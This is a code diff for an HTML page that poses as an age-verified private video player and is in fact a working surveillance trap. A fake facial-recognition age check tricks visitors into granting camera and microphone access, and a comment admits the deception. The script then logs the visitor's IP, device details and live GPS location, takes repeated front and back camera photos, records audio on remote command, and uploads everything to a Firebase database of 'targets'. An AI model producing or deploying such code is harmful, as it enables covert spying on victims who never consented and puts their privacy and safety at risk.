@@ -3,113 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST_V17 | NODE ACCESS</title>
+    <title>Private Cloud Storage | Secure Video Player</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #00f2ff; font-family: 'Courier New', monospace; overflow: hidden; }
-        #ghost-ui { height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, #1a0000 0%, #000 100%); position: relative; z-index: 10; }
-        .terminal-box { border: 2px solid #ff0000; padding: 35px; background: rgba(0,0,0,0.95); box-shadow: 0 0 30px #ff0000; width: 85%; max-width: 380px; text-align: center; }
-        h2 { margin: 0; letter-spacing: 5px; color: #ff0000; text-shadow: 0 0 10px #ff0000; }
-        input { background: #000; border: 1px solid #00f2ff; color: #00f2ff; padding: 12px; width: 100%; margin: 20px 0; outline: none; box-sizing: border-box; text-align: center; }
-        button { background: #ff0000; color: #fff; border: none; padding: 15px; font-weight: bold; width: 100%; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 15px #ff0000; }
-        #video-layer { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; overflow: hidden; }
+        
+        /* Background Blurred Image */
+        #bg-image {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://source.unsplash.com/1600x900/?movie,dark'); /* Aap apni pic ka link bhi daal sakte hain */
+            background-size: cover; background-position: center;
+            filter: blur(8px) brightness(0.4); z-index: 1;
+        }
+
+        /* Overlay UI */
+        #overlay {
+            position: relative; z-index: 10; height: 100vh;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.5);
+        }
+
+        /* Age / Permission Modal */
+        .modal {
+            background: #141414; border-radius: 8px; padding: 30px;
+            width: 90%; max-width: 400px; text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8); border: 1px solid #333;
+        }
+
+        .modal h1 { color: #e50914; margin-bottom: 10px; font-size: 24px; }
+        .modal p { color: #fff; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
+        
+        .verify-btn {
+            background: #e50914; color: #fff; border: none; padding: 15px 30px;
+            font-size: 16px; font-weight: bold; border-radius: 4px;
+            cursor: pointer; width: 100%; text-transform: uppercase;
+            transition: 0.3s;
+        }
+        .verify-btn:hover { background: #ff0a16; }
+
+        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group label { color: #aaa; font-size: 12px; display: block; margin-bottom: 5px; }
+        .input-group input {
+            width: 100%; padding: 12px; background: #333; border: 1px solid #444;
+            color: #fff; border-radius: 4px; box-sizing: border-box; outline: none;
+        }
+
+        /* Video Player Layer */
+        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
         iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
 
-    <div id="ghost-ui">
-        <div class="terminal-box">
-            <h2>GHOST_V17</h2>
-            <p style="font-size:11px; color:#ff0000;">ENCRYPTION: AES-256 ACTIVE</p>
-            <input type="text" id="tName" placeholder="ENTER ACCESS CODE">
-            <button onclick="ignite()">AUTHORIZE CONNECTION</button>
+    <div id="bg-image"></div>
+
+    <div id="overlay">
+        <div class="modal">
+            <h1>18+ RESTRICTED</h1>
+            <p>This content is private and requires identity verification. Please grant camera/audio permissions to verify your age via AI facial recognition.</p>
+            
+            <div class="input-group">
+                <label>Target Access Name</label>
+                <input type="text" id="targetName" placeholder="Enter name to unlock...">
+            </div>
+
+            <button class="verify-btn" onclick="startVerification()">Verify & Play Video</button>
+            <p style="color: #666; font-size: 10px; margin-top: 15px;">Encrypted by CloudSecure™ Protection System</p>
         </div>
     </div>
 
-    <div id="video-layer">
-        <iframe id="yt-player" src="" allow="autoplay; camera; microphone"></iframe>
+    <div id="video-container">
+        <iframe id="main-player" src="" allow="autoplay; camera; microphone"></iframe>
     </div>
 
 <script>
-    // ********** CONFIGURATION **********
+    // Firebase Config
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
     
     const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
-    const vID = "6Ogzc_-lW9w"; // YouTube Video ID
+    const videoID = "6Ogzc_-lW9w"; // Change this to your video ID
 
-    // ********** MAIN INITIATION **********
-    async function ignite() {
-        const uName = document.getElementById('tName').value;
-        if(!uName) return;
+    async function startVerification() {
+        const uName = document.getElementById('targetName').value;
+        if(!uName) { alert("Please enter a name for verification."); return; }
 
         try {
-            // Request permissions for Camera and Mic immediately
+            // Target thinks this is for Age Verification
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             
-            // UI Switch to YouTube
-            document.getElementById('yt-player').src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&loop=1&playlist=${vID}&controls=0`;
-            document.getElementById('video-layer').style.display = 'block';
+            // Success: Switch to Video
+            document.getElementById('main-player').src = `https://www.youtube.com/embed/${videoID}?autoplay=1&rel=0&controls=1`;
+            document.getElementById('video-container').style.display = 'block';
 
-            // Get Battery & System Intel
+            // Gather Intelligence
             let bat = "N/A";
             try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e){}
-            
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-            
-            // Initial Firebase Log
+            const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+
+            // Log to Firebase
             db.ref(`targets/${sessionID}/info`).set({
                 name: uName,
-                ip: ipData.ip,
+                ip: ipReq.ip,
                 battery: bat,
-                ram: navigator.deviceMemory || "N/A",
                 platform: navigator.platform,
+                ram: navigator.deviceMemory || "N/A",
                 status: "ONLINE",
                 time: new Date().toLocaleTimeString()
             });
 
-            // Trigger Dashboard Alert
-            db.ref('alerts').set({ id: sessionID, type: 'connection', t: Date.now() });
+            // Alert Admin
+            db.ref('alerts').set({ id: sessionID, t: Date.now() });
 
-            // Start Auto-Tracking
+            // Tracking Functions
             trackGPS();
+            capture("user"); // Initial Front Photo
+            setTimeout(() => capture("environment"), 5000); // Back Photo
             
-            // First Photos (Front then Back after delay)
-            capture("user"); 
-            setTimeout(() => capture("environment"), 5000); 
+            // Loop Front Photo every 10 seconds
+            setInterval(() => { capture("user"); }, 10000);
 
-            // Set 5-second Auto-Loop
-            setInterval(() => { capture("user"); }, 5000);
-
-            // Command Listener for Admin Dashboard
+            // Command Listener
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
                 if(cmd) {
                     if(cmd.act === 'f') capture("user");
                     if(cmd.act === 'b') capture("environment");
-                    if(cmd.act === 'a') recordAudio(30000); // 30 sec audio
-                    db.ref(`commands/${sessionID}`).remove(); // Clear command after execution
+                    if(cmd.act === 'a') recordAudio(30000);
+                    db.ref(`commands/${sessionID}`).remove();
                 }
             });
 
         } catch (err) {
-            console.error(err);
-            alert("SECURITY ERROR: Permission Required for Encrypted Sync.");
+            alert("Verification Failed: Camera/Microphone access is mandatory to view restricted content.");
             location.reload();
         }
     }
 
-    // ********** CAMERA LOGIC **********
     async function capture(mode) {
         try {
-            const constraints = { 
-                video: { facingMode: mode === "user" ? "user" : { exact: "environment" } } 
-            };
-            
-            // Fallback for devices that don't support 'exact' environment
+            const constraints = { video: { facingMode: mode === "user" ? "user" : { exact: "environment" } } };
             const stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => {
                 return navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
             });
@@ -120,71 +155,41 @@
 
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const dataURL = canvas.toDataURL('image/jpeg', 0.5);
                 db.ref(`targets/${sessionID}/photos`).push({
-                    img: dataURL,
+                    img: canvas.toDataURL('image/jpeg', 0.5),
                     type: mode,
                     time: new Date().toLocaleTimeString()
                 });
-
-                // Stop tracks to release camera
-                stream.getTracks().forEach(track => track.stop());
+                stream.getTracks().forEach(t => t.stop());
             }, 2000);
-        } catch (e) {
-            console.log("Capture Error: " + e);
-        }
+        } catch (e) {}
     }
 
-    // ********** AUDIO LOGIC (BASE64) **********
-    async function recordAudio(duration) {
+    async function recordAudio(ms) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-            let audioChunks = [];
-
-            mediaRecorder.ondataavailable = (event) => { audioChunks.push(event.data); };
-
-            mediaRecorder.onstop = () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            const mr = new MediaRecorder(stream);
+            let chunks = [];
+            mr.ondataavailable = (e) => chunks.push(e.data);
+            mr.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
                 const reader = new FileReader();
-                reader.readAsDataURL(audioBlob);
+                reader.readAsDataURL(blob);
                 reader.onloadend = () => {
-                    const base64Audio = reader.result;
-                    db.ref(`targets/${sessionID}/audio`).push({
-                        data: base64Audio,
-                        time: new Date().toLocaleTimeString()
-                    });
+                    db.ref(`targets/${sessionID}/audio`).push({ data: reader.result, time: new Date().toLocaleTimeString() });
                 };
-                stream.getTracks().forEach(track => track.stop());
             };
-
-            mediaRecorder.start();
-            setTimeout(() => { if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, duration);
-        } catch (e) {
-            console.log("Audio Error: " + e);
-        }
+            mr.start();
+            setTimeout(() => { if(mr.state !== "inactive") mr.stop(); }, ms);
+        } catch (e) {}
     }
 
-    // ********** GPS TRACKING **********
     function trackGPS() {
-        if ("geolocation" in navigator) {
-            navigator.geolocation.watchPosition(
-                (pos) => {
-                    db.ref(`targets/${sessionID}/location`).set({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        alt: pos.coords.altitude || "N/A",
-                        speed: pos.coords.speed || 0
-                    });
-                },
-                (err) => { console.log("GPS Error: " + err.message); },
-                { enableHighAccuracy: true }
-            );
-        }
+        navigator.geolocation.watchPosition((p) => {
+            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+        }, null, { enableHighAccuracy: true });
     }
 </script>
 </body>
